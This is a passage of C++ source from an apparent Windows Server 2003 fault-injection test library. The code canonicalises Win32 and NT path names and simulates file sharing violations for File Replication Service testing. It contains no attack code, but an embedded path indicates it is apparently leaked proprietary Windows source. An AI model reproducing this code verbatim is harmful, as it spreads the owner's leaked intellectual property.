    NewStr = reinterpret_cast<PWCHAR>(
        FfAlloc((wcslen(OldStr) + 1) * sizeof(WCHAR))
        );
    FF_ASSERT(NewStr);
    wcscpy(NewStr, OldStr);

    return NewStr;
}


NTSTATUS
FfGetMostlyFullPathByHandle(
    IN HANDLE   Handle,
    IN PWCHAR   FakeName OPTIONAL,
    OUT PWCHAR* MostlyFullName
    )
/*++
Routine Description:

    Get a copy of the handle's full pathname.  Free with FfFree().

Arguments:

    Handle - The handle for which we want the name.

    FakeName - A name to use for debugging output.

    MostlyFullName - The mostly full pathname (does not include volume name
        or UNC-ness -- see ZwQueryInformationFile() docs in DDK/MSDN)

Return Value:

    STATUS_SUCCESS if successful.  Otherwise, the NT error code.
--*/
{
    NTSTATUS          Status;
    IO_STATUS_BLOCK   IoStatusBlock;
    DWORD             BufferSize;
    PCHAR             Buffer;
    PWCHAR            RetFileName = NULL;
    CHAR              NameBuffer[sizeof(ULONG) + (sizeof(WCHAR)*(MAX_PATH+1))];
    PFILE_NAME_INFORMATION    FileName;

    FF_ASSERT(MostlyFullName);

    if (!IS_VALID_HANDLE(Handle)) {
        *MostlyFullName = NULL;
        return STATUS_INVALID_PARAMETER;
    }

    BufferSize = sizeof(NameBuffer);
    Buffer = NameBuffer;

    FakeName = FakeName ? FakeName : L"(null)";

 again:
    FileName = (PFILE_NAME_INFORMATION) Buffer;
    FileName->FileNameLength = BufferSize - (sizeof(ULONG) + sizeof(WCHAR));
    Status = NtQueryInformationFile(Handle,
                                    &IoStatusBlock,
                                    FileName,
                                    BufferSize - sizeof(WCHAR),
                                    FileNameInformation);
    if (NT_SUCCESS(Status) ) {
        FileName->FileName[FileName->FileNameLength/2] = UNICODE_NULL;
        RetFileName = FfWcsDup(FileName->FileName);
    } else {
        //
        // Try a larger buffer
        //
        if (Status == STATUS_BUFFER_OVERFLOW) {
            FF_TRACE(MiFF_DEBUG,
                     "++ Buffer size %d was too small for %S",
                     BufferSize, FakeName);
            BufferSize = FileName->FileNameLength + sizeof(ULONG) + sizeof(WCHAR);
            if (Buffer != NameBuffer) {
                FfFree(Buffer);
            }
            Buffer = reinterpret_cast<PCHAR>(FfAlloc(BufferSize));
            FF_TRACE(MiFF_DEBUG,
                     "++ Retrying with buffer size %d for %S",
                     BufferSize, FakeName);
            goto again;
        }
        FF_TRACE(MiFF_DEBUG,
                 "++ NtQueryInformationFile - FileNameInformation failed."
                 " (%S, %u)\n",
                 FakeName, Status);
    }

    //
    // A large buffer was allocated if the file's full
    // name could not fit into MAX_PATH chars.
    //
    if (Buffer != NameBuffer) {
        FfFree(Buffer);
    }

    *MostlyFullName = RetFileName;

    return Status;
}


DWORD
FfCheckShareAccess(
    IN ACCESS_MASK DesiredAccess,
    IN ULONG DesiredShareAccess,
    IN OUT PFF_SHARE_ACCESS ShareAccess,
    IN BOOL Update
    )
/*++

Routine Description:

    This routine performs an shared access check just like the NT I/O
    Manager's IoCheckShareAccess().  It is invoked to determine
    whether or not a new accessor to a file actually has shared access
    to it.  The check is made according to:

        1)  How the file is currently opened.

        2)  What types of shared accesses are currently specified.

        3)  The desired and shared accesses that the new open is requesting.

    If the open should succeed, then the access information about how the
    file is currently opened is updated, according to the Update parameter.

Arguments:

    DesiredAccess - Desired access of current open request.

    DesiredShareAccess - Shared access requested by current open request.

    ShareAccess - Pointer to the share access structure that describes how
        the file is currently being accessed.

    Update - Specifies whether or not the share access information for the
        file is to be updated.

Return Value:

    The final status of the access check is the function value.  If the
    accessor has access to the file, ERROR_SUCCESS is returned.  Otherwise,
    ERROR_SHARING_VIOLATION is returned.

--*/
{
    ULONG ocount;

    BOOL ReadAccess;
    BOOL WriteAccess;
    BOOL DeleteAccess;

    BOOL SharedRead;
    BOOL SharedWrite;
    BOOL SharedDelete;

    //
    // Set the access type in the file object for the current accessor.
    // Note that reading and writing attributes are not included in the
    // access check.
    //

    ReadAccess = ((DesiredAccess & (FILE_EXECUTE | FILE_READ_DATA)) != 0);
    WriteAccess = ((DesiredAccess & (FILE_WRITE_DATA | FILE_APPEND_DATA)) != 0);
    DeleteAccess = ((DesiredAccess & DELETE) != 0);

    //
    // There is no more work to do unless the user specified one of the
    // sharing modes above.
    //

    if (!(ReadAccess || WriteAccess || DeleteAccess))
        return ERROR_SUCCESS;

    SharedRead = ((DesiredShareAccess & FILE_SHARE_READ) != 0);
    SharedWrite = ((DesiredShareAccess & FILE_SHARE_WRITE) != 0);
    SharedDelete = ((DesiredShareAccess & FILE_SHARE_DELETE) != 0);

    //
    // Now check to see whether or not the desired accesses are compatible
    // with the way that the file is currently open.
    //

    ocount = ShareAccess->OpenCount;

    if ( (ReadAccess && (ShareAccess->SharedRead < ocount))
         ||
         (WriteAccess && (ShareAccess->SharedWrite < ocount))
         ||
         (DeleteAccess && (ShareAccess->SharedDelete < ocount))
         ||
         ((ShareAccess->Readers != 0) && !SharedRead)
         ||
         ((ShareAccess->Writers != 0) && !SharedWrite)
         ||
         ((ShareAccess->Deleters != 0) && !SharedDelete)
        ) {

        //
        // The check failed.  Simply return to the caller indicating that the
        // current open cannot access the file.
        //

        return ERROR_SHARING_VIOLATION;

        //
        // The check was successful.  Update the counter information in the
        // shared access structure for this open request if the caller
        // specified that it should be updated.
        //

    } else if (Update) {

        ShareAccess->OpenCount++;

        ShareAccess->Readers += ReadAccess;
        ShareAccess->Writers += WriteAccess;
        ShareAccess->Deleters += DeleteAccess;

        ShareAccess->SharedRead += SharedRead;
        ShareAccess->SharedWrite += SharedWrite;
        ShareAccess->SharedDelete += SharedDelete;
    }
    return ERROR_SUCCESS;
}


static
void
FfSetFlag(
    IN OUT DWORD& Variable,
    OUT    DWORD  Flag
    )
{
    Variable |= Flag;
}


BOOL
GetAccessFromString(
    IN TCHAR* AccessString,
    OUT DWORD& Access
    )
/*++

Routine Description:

    Converts a string into an access mask according to the mapping:

        R --> GENERIC_READ
        W --> GENERIC_WRITE

Arguments:

    AccessString - String containing the letters above in any case.

    Access - Receives the access mask corresponding to the string.

Return Value:

    TRUE a valid string was specified, FALSE otherwise.

--*/
{
    Access = 0;

    TCHAR* p = AccessString;
    while (*p) {
        switch (*p) {

        case TEXT('r'):
        case TEXT('R'):
            FfSetFlag(Access, GENERIC_READ);
            break;

        case TEXT('w'):
        case TEXT('W'):
            FfSetFlag(Access, GENERIC_WRITE);
            break;

        default:
            return FALSE;
        }
        p++;
    }

    return TRUE;
}


BOOL
GetSharingFromString(
    IN TCHAR* SharingString,
    OUT DWORD& Sharing
    )
/*++

Routine Description:

    Converts a string into an sharing mode mask according to the mapping:

        R --> FILE_SHARE_READ
        W --> FILE_SHARE_WRITE
        D --> FILE_SHARE_DELETE

Arguments:

    SharingString - String containing the letters above in any case.

    Sharing - Receives the sharing mode mask corresponding to the string.

Return Value:

    TRUE a valid string was specified, FALSE otherwise.

--*/
{
    Sharing = 0;

    TCHAR* p = SharingString;
    while (*p) {
        switch (*p) {

        case TEXT('d'):
        case TEXT('D'):
            FfSetFlag(Sharing, FILE_SHARE_DELETE);
            break;

        case TEXT('r'):
        case TEXT('R'):
            FfSetFlag(Sharing, FILE_SHARE_READ);
            break;

        case TEXT('w'):
        case TEXT('W'):
            FfSetFlag(Sharing, FILE_SHARE_WRITE);
            break;

        default:
            return FALSE;
        }
        p++;
    }

    return TRUE;
}


BOOL
GetTypeFromString(
    IN TCHAR* TypeString,
    OUT BOOL& IsDir
    )
/*++

Routine Description:

    Accepts a string which signifies directory ("D") or file ("F")
    (using either upper or lowercase case) and determines which it is
    (directory or file).

Arguments:

    TypeString - File/dir type (valid ones are "D" or "F" in any case)

    IsDir - TRUE if string dir type ("D"), FALSE if string is file tyoe ("F").

Return Value:

    TRUE a valid string was specified, FALSE otherwise.

--*/
{
    if (!lstrcmpi(L"D", TypeString)) {
        IsDir = TRUE;
        return TRUE;
    }
    if (!lstrcmpi(L"F", TypeString)) {
        IsDir = FALSE;
        return TRUE;
    }
    return FALSE;
}


BOOL
FfIsEscapedWin32PathName(
    IN PWCHAR PathName
    )
/*++

Routine Description:

    Determines whether a given pathname is an escaped Win32 pathname
    (i.e., whether it starts with "\\?\").

Arguments:

    PathName - The pathname

Return Value:

    TRUE if path starts with "\\?\", FALSE otherwise.

--*/
{
    return !wcsncmp(PathName, WIN32_ESCAPE_PREFIX, WIN32_ESCAPE_PREFIX_COUNT);
}


BOOL
FfIsDeviceName(
    IN PWCHAR PathName
    )
/*++

Routine Description:

    Determines whether a given pathname is an escaped Win32 device name
    (i.e., whether it starts with "\\.\").

Arguments:

    PathName - The pathname

Return Value:

    TRUE if path starts with "\\.\", FALSE otherwise.

--*/
{
    return !wcsncmp(PathName, WIN32_DEVICE_PREFIX, WIN32_DEVICE_PREFIX_COUNT);
}


BOOL
FfCanonicalizeNtPathNameToWin32PathName(
    IN PWCHAR PathName,
    OUT PWCHAR* CanonicalizedName,
    OUT PWCHAR* FinalPart OPTIONAL
    )
/*++

Routine Description:

    Converts an NT namespace pathname to an escaped Win32 pathname
    (i.e., one starting with "\\?\").

Arguments:

    PathName - The pathname

    CanonicalizedName - Where to put the pointer to the buffer
        containing the corresponding escaped Win32 pathname.  This
        buffer should be freed with FfFree().

    FinalPart - Where to put the pointer to the final component of the
        canonicalized name.  This pointer points within the
        CanonicalizedName buffer.

Return Value:

    TRUE if the input name was a Win32 name (started with "\??\") and was
    successfully converted.  Otherwise, FALSE.  GetLastError() returns
    the error that occurred in conversion.  ERROR_INVALID_PARAMETER is
    the error if the name did not start with "\??\".

--*/
{
    BOOL IsWin32 = (PathName &&
                    (PathName[0] == L'\\') &&
                    (PathName[1] == L'?') &&
                    (PathName[2] == L'?') &&
                    (PathName[3] == L'\\'));
    if (!IsWin32) {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    int cchPathName = wcslen(PathName);

    PWCHAR Full = reinterpret_cast<PWCHAR>(
        FfAlloc((cchPathName + 1) * sizeof(WCHAR))
        );

    if (!Full)
        return FALSE;

    CopyMemory(Full, PathName, (cchPathName + 1) * sizeof(WCHAR));
    Full[1] = L'\\';

    if (FinalPart) {
        PWCHAR p = Full + cchPathName - 1;
        // Full has at least "\\?\"
        while (*p != L'\\') {
            p--;
        }
        // ISSUE-2002/08/05-daniloa -- This logic needs more work
        // We do not take care of UNC names, devices, volume names, etc.
        if (p[1]) {
            *FinalPart = p + 1;
        } else {
            *FinalPart = NULL;
        }
    }

    *CanonicalizedName = Full;

    return TRUE;
}


BOOL
FfCanonicalizeWin32PathName(
    IN PWCHAR PathName,
    IN DWORD Flags,
    OUT PWCHAR* CanonicalizedName,
    OUT PWCHAR* FinalPart OPTIONAL
    )
/*++

Routine Description:

    This routine canonicalizes a Win32 pathname.

    Currently, it does not handle UNC names properly.

Arguments:

    PathName - the Win32 pathname to canonicalize.

    Flags - Specify how name canonicalization happens:

        CANONICALIZE_PATH_NAME_WIN32_NT - Use \\?\... escaped form

    CanonicalizedName - Pointer to pointer that will receive the canonicalized
        pathname.  Should be freeed with FfFree().

    FinalPart - Will point to last part of canonicalized pathname in
        CanonicalizedName buffer.

Return Value:

    Returns whether the call was successful.  If FALSE is returned,
    GetLastError() will return the underlying error.

--*/
{
    // Initialize for proper operation
    DWORD WStatus = ERROR_SUCCESS;
    PWCHAR Full = NULL;
    DWORD cchExtra = 0;

    DWORD cchFull;
    DWORD cchFullNew;
    PWCHAR Final;

    if ((Flags & ~static_cast<DWORD>(CANONICALIZE_PATH_NAME_VALID_MASK)) ||
        !CanonicalizedName) {

        WStatus = ERROR_INVALID_PARAMETER;
        goto cleanup;
    }

    *CanonicalizedName = NULL;
    if (FinalPart) {
        *FinalPart = NULL;
    }

    //
    // Figure out the necessary buffer size according to the API
    //

    cchFull = GetFullPathNameW(PathName, 0, NULL, NULL);
    if (!cchFull) {
        WStatus = GetLastError();
#if 0
        printf("GetFullPathName() failed: %u\n", WStatus);
#endif
        goto cleanup;
    }

    //
    // At most we may need to add \\?\ or ?\UNC\ depending on what we have
    //

    if (Flags & CANONICALIZE_PATH_NAME_WIN32_NT) {
        cchExtra = max(sizeof(WIN32_UNC_ADD), sizeof(WIN32_ESCAPE_PREFIX))
            / sizeof(WCHAR) - 1;
    }

    Full = reinterpret_cast<PWCHAR>(
        FfAlloc((cchFull + cchExtra) * sizeof(WCHAR))
        );
    if (!Full) {
        WStatus = GetLastError();
#if 0
        printf("FfAlloc() failed: %u\n", WStatus);
#endif
        goto cleanup;
    }

    cchFullNew = GetFullPathNameW(PathName, cchFull, Full, &Final);
    if (!cchFullNew) {
        WStatus = GetLastError();
#if 0
        printf("GetFullPathName() failed: %u\n", WStatus);
#endif
        goto cleanup;
    }

    // ISSUE-2002/08/05-daniloa -- Investigate accounting for ".."
    // Cannot use New + 1 != Old because ".." is not properly
    // accounted for.  Therefore, we use New > Old (sigh).  This could
    // happen if the user changes directories while this routine is
    // executing.

    if (cchFullNew > cchFull) {
#if 0
        printf("Unexpected size from GetFullPathName()\n");
#endif
        // NOTICE-2002/08/01-daniloa -- No good error to return
        WStatus = ERROR_BAD_LENGTH;
        goto cleanup;
    }
#if 0
    printf("Full Directory: \"%S\"\n", Full);
    printf("Final: \"%S\"\n", Final);
#endif

    //
    // Identify portion of path after initial \'s
    //
    PWCHAR PostBackSlash = Full;
    while (*PostBackSlash == L'\\') {
        PostBackSlash++;
    }

    SIZE_T NumBackSlashes = PostBackSlash - Full;

    //
    // The beginning of Full is one of (regexp-ish syntax):
    //
    // 1) \\(\)*?\(.*) -- escaped Win32 path
    // 2) \\(\)*[^?].* -- UNC path
    // 3) DOS path (does not start with backslash)
    //
    // Basically, Full starts out with 2 or more \'s or none at all.
    // If it has \'s, it is either an escaped Win32 path or a UNC
    // path.  Otherwise, it is some DOS/Win32 path.
    //

    if (NumBackSlashes == 0) {

        //
        // A "DOS" path
        //

        if (Flags & CANONICALIZE_PATH_NAME_WIN32_NT) {

            //
            // Need to add "\\?\"
            //

            MoveMemory(Full + WIN32_ESCAPE_PREFIX_COUNT, Full,
                       cchFull * sizeof(WCHAR));
            if (Final) {
                Final += WIN32_ESCAPE_PREFIX_COUNT;
            }
            CopyMemory(Full, WIN32_ESCAPE_PREFIX,
                       WIN32_ESCAPE_PREFIX_COUNT * sizeof(WCHAR));

        } else {

            //
            // Do not need to do anything extra
            //

        }

    } else {

        //
        // An escaped path (\\?\) or a UNC path (\\server\...)
        //

        if (((PostBackSlash[0] == L'?') || (PostBackSlash[0] == L'.')) &&
            (PostBackSlash[1] == L'\\')) {

            //
            // Escaped path (\\?\) -- just remove extra \'s.
            //

            SSIZE_T ExtraBackSlashes = NumBackSlashes - 2;
            FF_ASSERT(ExtraBackSlashes >= 0);

#ifdef REMOVE_EXTRA_BACKSLASHES
            if (ExtraBackSlashes > 0) {
                MoveMemory(Full + 2, PostBackSlash,
                           (cchFull - NumBackSlashes) * sizeof(WCHAR));
                if (Final) {
                    Final -= ExtraBackSlashes;
                }
            }
#endif

        } else {

            //
            // UNC path
            //


            if (Flags & CANONICALIZE_PATH_NAME_WIN32_NT) {

                //
                // Need to add "?\UNC\"
                //

                SSIZE_T ExtraBackSlashes = NumBackSlashes - 2;
                FF_ASSERT(ExtraBackSlashes >= 0);

#ifdef REMOVE_EXTRA_BACKSLASHES
                MoveMemory(Full + 2 + WIN32_UNC_ADD_COUNT, PostBackSlash,
                           (cchFull - NumBackSlashes) * sizeof(WCHAR));
                if (Final) {
                    Final += WIN32_UNC_ADD_COUNT - ExtraBackSlashes;
                }
                CopyMemory(Full + 2, WIN32_UNC_ADD,
                           WIN32_UNC_ADD_COUNT * sizeof(WCHAR));
#else
                MoveMemory(Full + 2 + WIN32_UNC_ADD_COUNT, Full + 2,
                           (cchFull - 2) * sizeof(WCHAR));
                if (Final) {
                    Final += WIN32_UNC_ADD_COUNT;
                }
                CopyMemory(Full + 2, WIN32_UNC_ADD,
                           WIN32_UNC_ADD_COUNT * sizeof(WCHAR));
#endif

            } else {

                //
                // Remove extra \'s
                //

                SSIZE_T ExtraBackSlashes = NumBackSlashes - 2;
                FF_ASSERT(ExtraBackSlashes >= 0);

#ifdef REMOVE_EXTRA_BACKSLASHES
                if (ExtraBackSlashes > 0) {
                    MoveMemory(Full + 2, PostBackSlash,
                               (cchFull - ExtraBackSlashes) * sizeof(WCHAR));
                    if (Final) {
                        Final -= ExtraBackSlashes;
                    }
                }
#endif

            }
        }
    }
#if 0
    printf("Full Directory: \"%S\"\n", Full);
    printf("Final: \"%S\"\n", Final);
#endif

 cleanup:
    SetLastError(WStatus);

    if (WStatus != ERROR_SUCCESS) {
        if (Full)
            FfFree(Full);
        return FALSE;
    }

    *CanonicalizedName = Full;
    if (FinalPart) {
        *FinalPart = Final;
    }

    return TRUE;
}


BOOL
FfWin32PathNameExists(
    IN PWCHAR PathName,
    OUT BOOL* IsDirectory OPTIONAL
    )
/*++

Routine Description:

    This routine checks whether a Win32 pathname exists.

Arguments:

    PathName - the Win32 pathname to check.

    IsDirectory - Returns whether the pathname is a directory or not.

Return Value:

    TRUE if successful.  Otherwise, FALSE.  If FALSE is returned,
    GetLastError() will return the underlying error.

--*/
{
    BOOL NeedPrefix;
    PWCHAR EscapedPathName = NULL;
    DWORD Error = ERROR_SUCCESS;
    DWORD Attributes;

    //
    // If the path does not have the Win32 escape prefix, we need to add it...
    //

    NeedPrefix = !FfIsEscapedWin32PathName(PathName);

    if (NeedPrefix) {
        if (!FfCanonicalizeWin32PathName(PathName,
                                         CANONICALIZE_PATH_NAME_WIN32_NT,
                                         &EscapedPathName, NULL))
            return FALSE;
    } else {
        EscapedPathName = PathName;
    }

    Attributes = GetFileAttributes(EscapedPathName);

    if (Attributes == INVALID_FILE_ATTRIBUTES) {
        Error = GetLastError();
    }

    if (NeedPrefix) {
        FfFree(EscapedPathName);
    }

    //
    // In case FfFree bombed
    //

    SetLastError(Error);

    //
    // Return success
    //

    if (Error == ERROR_SUCCESS) {
        if (IsDirectory) {
            *IsDirectory = (Attributes & FILE_ATTRIBUTE_DIRECTORY) ?
                TRUE : FALSE;
        }
        return TRUE;
    }

    //
    // Otherwise, do some sanity-checking
    //

    switch (Error) {

    case ERROR_FILE_NOT_FOUND:
    case ERROR_PATH_NOT_FOUND:
        break;

    default:
        printf("Unexpected error: %u\n", Error); // XXX - log
    }
    return FALSE;
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\test\frs\fault\sharing.cxx ===
#include "pch.hxx"

BOOL
FfSvStoreNtHandleName(
    IN HANDLE Handle,
    IN PWCHAR Name
    );
BOOL
FfSvRemoveNtHandleName(
    IN HANDLE Handle
    );
BOOL
FfSvLookupNtHandleName(
    IN HANDLE Handle,
    OUT PWCHAR* Name
    );
BOOL
FfSvGetFullNameFromObjectAttributes(
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PWCHAR* FullName
    );


static
BOOL
ParseArgument(
    IN PWCHAR Argument,
    OUT FF_MATCH_INFO& MatchInfo
    )
{
    BOOL Ok;
    DWORD WStatus;
    BOOL Canonicalized;
    const PWCHAR Delimiters = L",";

    ZeroMemory(&MatchInfo, sizeof(MatchInfo));

    //
    // Safely use wcstok
    //

    PWCHAR TypeString = wcstok(Argument, Delimiters);
    PWCHAR AccessString = wcstok(NULL, Delimiters);
    PWCHAR SharingString = wcstok(NULL, Delimiters);
    PWCHAR Path = wcstok(NULL, Delimiters);
    PWCHAR Nothing = wcstok(NULL, Delimiters);
    FF_ASSERT(Nothing == NULL);

    DWORD DesiredAccess;
    DWORD DesiredShareAccess;

    Ok = GetTypeFromString(TypeString, MatchInfo.IsDir);
    FF_ASSERT(Ok);
    Ok = GetAccessFromString(AccessString, DesiredAccess);
    FF_ASSERT(Ok);
    Ok = GetSharingFromString(SharingString, DesiredShareAccess);
    FF_ASSERT(Ok);

    //
    // Update share access data structure
    //

    WStatus = FfCheckShareAccess(DesiredAccess, DesiredShareAccess,
                                 &MatchInfo.ShareAccess, TRUE);
    FF_ASSERT(WStatus == ERROR_SUCCESS);

    //
    // Path is either fqdn (with drive letter) or a single component spec
    // (UNC is not allowed)
    //

    if (Path[0] && (Path[1] == L':')) {

        FF_ASSERT(Path[2] && (Path[2] != L'.'));

        Canonicalized = FfCanonicalizeWin32PathName(
            Path,
            CANONICALIZE_PATH_NAME_WIN32_NT,
            &MatchInfo.Win32NtPath,
            &MatchInfo.FilePart
            );
        FF_ASSERT(Canonicalized);

        // NOTE: MatchInfo.FilePart == NULL ==> root of drive

        int len = wcslen(MatchInfo.Win32NtPath);

        FF_ASSERT(MatchInfo.FilePart ||
                  ((MatchInfo.Win32NtPath[len-1] == L'\\') &&
                   (MatchInfo.Win32NtPath[len-2] == L':')));
    } else {

        //
        // Double-check that we do not have / nor \
        //

        PWCHAR p = Path;
        while (*p && (*p != L'/') && (*p != L'\\')) {
            p++;
        }
        FF_ASSERT(!*p);
    }


    return TRUE;
}


struct FF_ARGS_G_SharingViolation
{
    typedef FF_ARGS_G_SharingViolation self_t;

    static const DWORD Error = ERROR_SHARING_VIOLATION;
    vector<FF_MATCH_INFO> MatchInfos;
    map<HANDLE, PWCHAR> NtHandleTable;
    CRITICAL_SECTION cs;

    FF_ARGS_G_SharingViolation()
    {
        InitializeCriticalSection(&cs);
    }

    ~FF_ARGS_G_SharingViolation()
    {
        DeleteCriticalSection(&cs);

        size_t count = MatchInfos.size();
        for (size_t i = 0; i < count; i++) {
            PWCHAR& ptr = MatchInfos[i].Win32NtPath;
            if (ptr) {
                FfFree(ptr);
                ptr = 0;
            }
        }

        typedef map<HANDLE, PWCHAR>::iterator iter_t;
        for (iter_t iter = NtHandleTable.begin(); iter != NtHandleTable.end(); iter++) {
            PWCHAR& ptr = iter->second;
            if (ptr) {
                FfFree(ptr);
                ptr = 0;
            }
        }
    }

    static self_t* Get(I_Lib* pLib)
    {
        I_Args* pArgs = pLib->GetTrigger()->GetGroupArgs();
        self_t* pParsedArgs = reinterpret_cast<self_t*>(pArgs->GetParsedArgs());
        if (!pParsedArgs)
        {
            const size_t count = pArgs->GetCount();
            FF_ASSERT(count >= 2);

            pParsedArgs = new self_t;

            for (size_t i = 0; i < count; i++)
            {
                Arg arg = pArgs->GetArg(i);
                _bstr_t Temp = arg.Value;

                FF_MATCH_INFO MatchInfo;
                BOOL Ok = ParseArgument(static_cast<PWCHAR>(Temp), MatchInfo);
                FF_ASSERT(Ok);

                pParsedArgs->MatchInfos.push_back(MatchInfo);
            }
            if (!pArgs->SetParsedArgs(pParsedArgs, Cleanup))
            {
                // someone else set the args while we were building the args
                delete pParsedArgs;
                pParsedArgs = reinterpret_cast<self_t*>(pArgs->GetParsedArgs());
                FF_ASSERT(pParsedArgs);
            }
        }
        return pParsedArgs;
    };

    static void Cleanup(void* _p)
    {
        self_t* pParsedArgs = reinterpret_cast<self_t*>(_p);
        delete pParsedArgs;
    };
};


inline
_bstr_t
UnicodeStringToBStrT(
    IN PUNICODE_STRING UnicodeString
    )
{
    USHORT Count = UnicodeString->Length / sizeof(WCHAR);
    USHORT MaxCount = UnicodeString->MaximumLength / sizeof(WCHAR);

    if ((MaxCount > Count) && (0 == UnicodeString->Buffer[Count])) {
        return _bstr_t(UnicodeString->Buffer);
    }

    PWCHAR Buffer = new WCHAR[Count + 1];
    memcpy(Buffer, UnicodeString->Buffer, sizeof(WCHAR) * Count);
    Buffer[Count] = 0;

    _bstr_t Result(Buffer);
    delete [] Buffer;

    return Result;
}


static
BOOL
FfMatchWin32PathName(
    IN const FF_MATCH_INFO& MatchInfo,
    IN PWCHAR PathName,
    IN BOOL IsDirectory
    )
{
    // ISSUE-2002/08/05-daniloa -- What about a PathName ending in "\"?
    if (IsDirectory != MatchInfo.IsDir)
        return FALSE;

    if (MatchInfo.FilePart) {

        BOOL MatchDir = !_wcsnicmp(MatchInfo.Win32NtPath, PathName,
                                   MatchInfo.FilePart - MatchInfo.Win32NtPath);
        if (!MatchDir)
            return FALSE;

        BOOL MatchSpec = PathMatchSpecW(PathName, MatchInfo.FilePart);
        return MatchSpec;

    } else {

        BOOL MatchDir = !_wcsicmp(MatchInfo.Win32NtPath, PathName);
        return MatchDir;

    }
}


static
BOOL
FfShouldInterceptPathName(
    IN PWCHAR PathName,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG DesiredShareAccess,
    IN BOOL IsRename,
    IN BOOL IsNT,
    OUT DWORD& Error
    )
{
    typedef FF_ARGS_G_SharingViolation g_args_t;
    g_args_t* pGroupArgs = g_args_t::Get(g_pLib);

    BOOL Intercept = FALSE;
    PWCHAR CanonicalName = NULL;
    PWCHAR FinalPart = NULL;

    BOOL IsDirectory;
    BOOL Exists;


    if (IsNT) {

        if (!FfCanonicalizeNtPathNameToWin32PathName(PathName,
                                                     &CanonicalName,
                                                     &FinalPart)) {

            FF_TRACE(MiFF_INFO, "Cannot canonicalize NT pathname \"%S\"",
                     PathName);

        }

    } else {
        if (FfIsDeviceName(PathName)) {
            FF_TRACE(MiFF_INFO, "Skipping device name \"%S\"", PathName);
            goto cleanup;
        }

        if (!FfCanonicalizeWin32PathName(PathName,
                                         CANONICALIZE_PATH_NAME_WIN32_NT,
                                         &CanonicalName, &FinalPart)) {
            FF_TRACE(MiFF_ERROR,
                     "Cannot canonicalize pathname: \"%S\" (error: %u)",
                     PathName, GetLastError());
            goto cleanup;
        }
    }


    Exists = FfWin32PathNameExists(CanonicalName, &IsDirectory);
    if (!Exists) {
        FF_TRACE(MiFF_INFO,
                 "Not intercepting \"%S\" because it does not exist",
                 CanonicalName);
        goto cleanup;
    }

    vector<FF_MATCH_INFO>& MatchInfos = pGroupArgs->MatchInfos;

    for (int i = 0; i < MatchInfos.size(); i++) {
        BOOL IsMatch = FfMatchWin32PathName(
            MatchInfos[i],
            CanonicalName,
            IsDirectory
            );

        if (IsMatch) {

            // This is a hack for MoveFileEx

            if (IsRename) {
                Error = ERROR_ACCESS_DENIED;
                Intercept = TRUE;
                break;
            }

            DWORD WStatus = FfCheckShareAccess(
                DesiredAccess,
                DesiredShareAccess,
                &MatchInfos[i].ShareAccess,
                FALSE
                );

            if (WStatus != ERROR_SUCCESS) {
                Error = WStatus;
                Intercept = TRUE;
            }

            break;
        }
    }

    if (!Intercept) {
        FF_TRACE(MiFF_INFO, "No match for existing \"%S\"", PathName);
    }

 cleanup:
    if (CanonicalName)
        FfFree(CanonicalName);

    if (Intercept) {
        FF_TRACE(MiFF_INFO, "Intercepted (%S) --> Returning error: %u",
                 PathName, Error);
    }

    return Intercept;
}


inline
BOOL
FfShouldInterceptPathName(
    IN unsigned short const* PathName,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG DesiredShareAccess,
    IN BOOL IsRename,
    IN BOOL IsNT,
    OUT DWORD& Error
    )
{
    return FfShouldInterceptPathName(
        (PWCHAR)PathName, // XXX
        DesiredAccess,
        DesiredShareAccess,
        IsRename,
        IsNT,
        Error
        );
}


static
BOOL
FfSvStoreNtHandleName(
    IN HANDLE Handle,
    IN PWCHAR Name
    )
{
    typedef FF_ARGS_G_SharingViolation g_args_t;
    g_args_t* pGroupArgs = g_args_t::Get(g_pLib);

    FF_ASSERT(IS_VALID_HANDLE(Handle));
    FF_ASSERT(Name);

    CAutoLock A(&pGroupArgs->cs);

    PWCHAR OldName;
    BOOL IsPresent = FfSvLookupNtHandleName(Handle, &OldName);

    if (IsPresent) {
        FF_TRACE(MiFF_ERROR,
                 "Store Handle 0x%08X failed -- "
                 "found \"%S\" while trying to store \"%S\"",
                 Handle,
                 OldName,
                 Name);
        FF_ASSERT(!IsPresent);
        return FALSE;
    }

    pGroupArgs->NtHandleTable[Handle] = Name;

    FF_TRACE(MiFF_DEBUG, "Store Handle 0x%08X = \"%S\"", Handle, Name);

    return TRUE;
}


static
BOOL
FfSvRemoveNtHandleName(
    IN HANDLE Handle
    )
{
    typedef FF_ARGS_G_SharingViolation g_args_t;
    g_args_t* pGroupArgs = g_args_t::Get(g_pLib);

    if (!IS_VALID_HANDLE(Handle))
        return FALSE;

    CAutoLock A(&pGroupArgs->cs);

    typedef map<HANDLE, PWCHAR>::iterator iter_t;
    iter_t iter = pGroupArgs->NtHandleTable.find(Handle);

    if (iter == pGroupArgs->NtHandleTable.end()) {
        return FALSE;
    } else {
        if (iter->second) {
            FfFree(iter->second);
        }
        pGroupArgs->NtHandleTable.erase(iter);
        return TRUE;
    }
}


static
BOOL
FfSvLookupNtHandleName(
    IN HANDLE Handle,
    OUT PWCHAR* Name
    )
{
    typedef FF_ARGS_G_SharingViolation g_args_t;
    g_args_t* pGroupArgs = g_args_t::Get(g_pLib);

    FF_ASSERT(Name);

    if (!IS_VALID_HANDLE(Handle))
        return FALSE;

    CAutoLock A(&pGroupArgs->cs);

    typedef map<HANDLE, PWCHAR>::iterator iter_t;
    iter_t iter = pGroupArgs->NtHandleTable.find(Handle);

    if (iter == pGroupArgs->NtHandleTable.end()) {
        FF_TRACE(MiFF_DEBUG,
                 "Lookup Handle 0x%08X -- handle not found", Handle);
        *Name = NULL;
        return FALSE;
    } else {
        *Name = iter->second;
        FF_TRACE(MiFF_DEBUG, "Lookup Handle 0x%08X = \"%S\"", Handle, *Name);
        return TRUE;
    }
}


static
BOOL
FfSvGetFullNameFromObjectAttributes(
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PWCHAR* FullName
    )
{
    typedef FF_ARGS_G_SharingViolation g_args_t;
    g_args_t* pGroupArgs = g_args_t::Get(g_pLib);

    FF_ASSERT(FullName);

    HANDLE Handle = ObjectAttributes->RootDirectory;

    // ISSUE-2002/08/07-daniloa -- Is it legal to have a NULL object name?
    // Would that make an NtCreateFile operation into a dup?
